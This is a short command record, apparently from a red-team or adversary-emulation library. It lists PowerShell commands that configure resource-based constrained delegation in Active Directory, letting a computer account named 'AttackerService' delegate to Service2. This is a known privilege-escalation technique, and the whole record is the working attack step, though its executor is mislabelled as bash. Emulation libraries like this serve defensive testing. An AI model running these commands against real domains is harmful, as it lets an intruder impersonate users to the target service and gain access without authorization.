---
id: 2806f89e-b4b4-457f-9ad3-52f7f76f13fd
name: Set PrincipalsAllowedToDelegateToAccount
type: command
executor: bash
data: 'Install-WindowsFeature RSAT-AD-PowerShell

  Import-Module ActiveDirectory

  Get-ADComputer AttackerService

  Set-ADComputer Service2 -PrincipalsAllowedToDelegateToAccount AttackerService$

  Get-ADComputer Service2 -Properties PrincipalsAllowedToDelegateToAccount'
output: null
created_at: '2023-04-06T03:56:07.952094+00:00'
updated_at: '2023-04-10T20:26:20.679788+00:00'
---

# Set PrincipalsAllowedToDelegateToAccount

```bash
Install-WindowsFeature RSAT-AD-PowerShell
Import-Module ActiveDirectory
Get-ADComputer AttackerService
Set-ADComputer Service2 -PrincipalsAllowedToDelegateToAccount AttackerService$
Get-ADComputer Service2 -Properties PrincipalsAllowedToDelegateToAccount
```


